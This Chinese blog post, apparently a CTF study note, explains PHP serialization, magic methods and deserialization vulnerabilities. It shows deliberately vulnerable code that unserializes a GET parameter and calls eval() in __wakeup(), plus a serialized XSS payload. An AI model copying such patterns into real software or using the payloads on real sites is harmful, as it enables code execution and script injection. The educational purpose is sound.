<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Qhkk" />



<meta name="description" content="序列化与反序列化说明 序列化：将变量（通常是数组和对象）转换为可保存或传输的字符串 反序列化：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。反序列化本身不是漏洞，但如果反序列化的内容可控，就容易导致漏洞。 访问控制 PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected">
<meta property="og:type" content="article">
<meta property="og:title" content="php反序化和pop链">
<meta property="og:url" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/index.html">
<meta property="og:site_name" content="Qhkk&#39;s blog">
<meta property="og:description" content="序列化与反序列化说明 序列化：将变量（通常是数组和对象）转换为可保存或传输的字符串 反序列化：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。反序列化本身不是漏洞，但如果反序列化的内容可控，就容易导致漏洞。 访问控制 PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650896937315-8244eb55-b46c-4247-8b97-cf75bb957abc.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650978852065-71e1f157-197b-48e1-ac10-066176d950fe.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650979275764-8fc54f7f-f865-41ca-ab69-e0f010973818.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650979379510-689b934d-474d-40fc-8b02-bb8ef144a8bb.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650980739535-027c0865-127f-4687-be53-8353d100e8ab.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650980680493-ab62722a-d8ab-42ae-869a-51200f2edbac.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650981834094-b04c4e6d-54cd-463c-9cb7-47f84779321c.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650982481650-532cec7d-efb5-4dea-8374-eccbb0202843.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569028390-a74e869e-b94f-470e-8740-4bb62d5ea0a9.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569368590-46066570-31cc-4162-8b0d-9fe5e1c85f97.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569456460-271f9990-534a-41dd-983e-88817e46d7e3.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569667295-b74fee32-0ed4-4380-adcc-e5455afcae36.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651569738629-7e66a481-8c28-474a-9e06-c0ff459b158c.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651637062612-c7eee25d-dd33-4e57-b8ef-1dd785c928fe.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651637607103-76e39b85-9977-42f8-b7af-a66fc3bccedc.png">
<meta property="og:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1651643182075-05e47c76-8d5a-4744-9a1f-3e6c043984e2.png">
<meta property="article:published_time" content="2022-05-04T16:00:00.000Z">
<meta property="article:modified_time" content="2022-05-28T09:11:38.884Z">
<meta property="article:author" content="Qhkk">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650896937315-8244eb55-b46c-4247-8b97-cf75bb957abc.png">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="Qhkk&#39;s blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.png">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">



<link rel="stylesheet" href="/css/style.css">




<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>php反序化和pop链 | Qhkk&#39;s blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: 
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






<meta name="generator" content="Hexo 6.1.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/"></a></h1>
        </hgroup>

        

        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">ctf刷题记录</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">专注于前端</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-php反序化和pop链" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/" class="article-date">
      <time datetime="2022-05-04T16:00:00.000Z" itemprop="datePublished">2022-05-05</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      php反序化和pop链
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p><strong>说明</strong></p>
<p><strong>序列化</strong>：将变量（通常是数组和对象）转换为可保存或传输的字符串</p>
<p><strong>反序列化</strong>：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。</p>
<p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。反序列化本身不是漏洞，但如果反序列化的内容可控，就容易导致漏洞。</p>
<p><strong>访问控制</strong></p>
<p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</p>
<ul>
<li><strong>public（公有）：</strong>公有的类成员可以在任何地方被访问。</li>
<li><strong>protected（受保护）：</strong>受保护的类成员则可以被其自身以及其子类和父类访问。</li>
<li><strong>private（私有）：</strong>私有的类成员则只能被其定义所在的类访问。</li>
</ul>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p><strong>serialize()</strong></p>
<p>string serialize ( mixed $value )</p>
<p>$value: 要序列化的对象或数组。结果返回一个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ok&quot;;s:3:&quot;var&quot;;N&#125;</span><br><span class="line"></span><br><span class="line">//0代表这是一个对象，4代表对象名称的长度，2代表成员个数。</span><br><span class="line">//大括号中分别是：属性名类型、长度、名称；值类型、长度、值</span><br><span class="line">//O: 对象 4（类的名字长度为4）&quot;Test&quot;类名称</span><br><span class="line">//2 （对象含有的属性数量）</span><br><span class="line">//s:属性是字符串  4 是属性名称的长度 &quot;test&quot; 属性名称 s:2:&quot;ok&quot; 属性是字符串，长度2，值为&quot;ok&quot; </span><br><span class="line">// s:另一个属性是字符串，3长度，var，属性值，N NULL另一个属性初始值为空  </span><br></pre></td></tr></table></figure>

<p><strong>不同权限的属性，序列化之后的字符串存在区别：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;serialize.txt&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Test&quot;:1:&#123;s:4:&quot;text&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>换成private权限，属性在序列化后也会出现区别</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>=<span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;serialize.txt&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Test&quot;:2:&#123;s:10:&quot;Testtest&quot;;s:2:&quot;ok&quot;;s:9:&quot;Testvar&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>unserlialize()</p>
<p>mixed unserialize(string $str)</p>
<p>$str：序列化后的字符串  。返回的是转化之后的值，可为 integer、float、string、array 或 object。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$unserialized_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$unserialized_data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">//运行结果如下：</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; Google</span></span><br><span class="line"><span class="comment">    [1] =&gt; Runoob</span></span><br><span class="line"><span class="comment">    [2] =&gt; Facebook</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<h2 id="序列化与反序列化实现"><a href="#序列化与反序列化实现" class="headerlink" title="序列化与反序列化实现"></a>序列化与反序列化实现</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;lily&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span> = <span class="string">&quot;woman&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hobby</span> = <span class="string">&quot;violin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">intro</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;打印结果如下：\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line"><span class="variable">$person1</span>-&gt;<span class="title function_ invoke__">intro</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;========================\n&quot;</span>;</span><br><span class="line"><span class="variable">$mid</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$person1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$mid</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;========================\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$mid</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650896937315-8244eb55-b46c-4247-8b97-cf75bb957abc.png" alt="img"></p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>PHP魔术方法</p>
<p>除了<code> __construct()</code>，<code> __destruct()</code> ，和<code> __clone()</code> 之外的所有魔术方法都 必须 声明为 public</p>
<p>__construct()	构造函数，当对象创建(new)时会自动调用，但在unserialize()时是不会自动调用的。	</p>
<p>__destruct()		当对象被销毁时会自动调用		</p>
<p>__sleep()		用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组，serialize() 函数会检查类中是否存在一个魔术方法 __sleep(),如果存在，该方法会先被调用，然后才执行序列化操作</p>
<p>__wakeup()		新建立数据库连接，或执行其它初始化操作	unserialize()会检查是否存在 __wakeup()，如果存在，则会优先调用 </p>
<p>__toString()		当一个类被转换成字符串时被调用	</p>
<p>__invoke()		当以函数方式调用对象时被调用	</p>
<p>__get()			访问私有类中的变量时，触发</p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>猜测：如果我们将序列化的字符串按格式要求随意更改，是不是可以控制intro()方法的打印信息？</p>
<p>假设：存在url</p>
<p>127.0.0.1&#x2F;usr.php</p>
<p>其对应的后台代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;echo &#x27;I am isee&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="string">&quot;<span class="subst">$this</span>-&gt;name;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mid&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$mid</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;mid&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="string">&quot;<span class="subst">$mid</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;hello!!!&lt;h1/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这段代码定义了一个person类，person类里存在一个敏感函数eval()可以执行任意代码，当反序列化这个person类形成的特殊字符串时会自动触发__wakeup()魔术方法，从而执行eval()函数（本例中，正常情况下，eval()触发会将$name的值当PHP代码解析，即输出I am isee )，访问该页面，不传递参数时返回一个hello！！！信息</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650978852065-71e1f157-197b-48e1-ac10-066176d950fe.png" alt="img"></p>
<p>如果带上?mid参数服务器后端对应的PHP代码将会反序列化这个用户传参，此时如果我们在本地正常序列化这个peson类并拼接到?mid的结果是这样的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;echo &#x27;i am isee&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$person1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line">    <span class="variable">$mid</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$person1</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$mid</span>);</span><br></pre></td></tr></table></figure>

<p>本地运行：</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650979275764-8fc54f7f-f865-41ca-ab69-e0f010973818.png" alt="img"></p>
<p>url拼接mid参数后访问浏览器：</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650979379510-689b934d-474d-40fc-8b02-bb8ef144a8bb.png" alt="img"></p>
<p>可以清楚的看到，传递序列化后的字符串成功的被后台的unserialize()还原成了原本的person类，从而触发了__wakeup魔术方法，最终eval()成功的将$name的值 echo ‘I am isee’将PHP代码解析，输出了I am isee字样</p>
<p>那么，如果我们自定义这个序列化后的特殊字符串，会怎么样？</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650980739535-027c0865-127f-4687-be53-8353d100e8ab.png" alt="img"></p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650980680493-ab62722a-d8ab-42ae-869a-51200f2edbac.png" alt="img"></p>
<p><strong>简单小结一下PHP序列化与反序列化漏洞的成因：</strong></p>
<p>反序列化本身不是漏洞，但如果<code>PHP序列化与反序列化的过程用户可控</code>，那么在反序列化过程中就会自动执行魔术方法，从而导致安全问题</p>
<p>所以，通常反序列化漏洞的成因在于代码中的 <code>__unserialize()</code>,<code>__wakeup()</code>等魔术方法接收的参数可控，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650981834094-b04c4e6d-54cd-463c-9cb7-47f84779321c.png" alt="img"></p>
<p>查看源代码，是哪行代码造成了这个反序列化漏洞</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650982481650-532cec7d-efb5-4dea-8374-eccbb0202843.png" alt="img"></p>
<p>发现<code>__construct()函数，</code>说明在创建对象时就会自动调用echo $this-&gt;test;</p>
<p>将以下类进行序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;攻击语句，如()&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据源代码得到语句：</p>
<p>O:1:”S”:1:{s:4:”test”;s:29:”<script>alert('xss')</script>“;}</p>
<p>先用排除法，先把33行注释掉， 输入payload<code>（O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;）</code>之后没有弹框，说明这不是__construct()的锅，到此已经可以判断是第33行起的作用了，保险起见还是再试一下。  </p>
<p>然后放出33行，把__construct()注释，输入payload（O:1:”S”:1:{s:4:”test”;s:29:”<script>alert('xss')</script>“;}）之后发现弹窗。</p>
<p>原因是： __construct()这个函数虽然在对象创建时会被调用，但反序列化（unserialize()）的时候并不会被调用。  </p>
<h1 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h1><p>反序列化的漏洞是以控制魔术方法为出发点，通过魔术方法来达到攻击的目的，但是很多时候很难直接通过魔术方法找到可以攻击的点，所以就需要寻找相同函数名将类的属性和敏感函数的属性联系起来，使得部分属性被我们所控制，从而达到攻击目的。这就是<strong>POP链</strong></p>
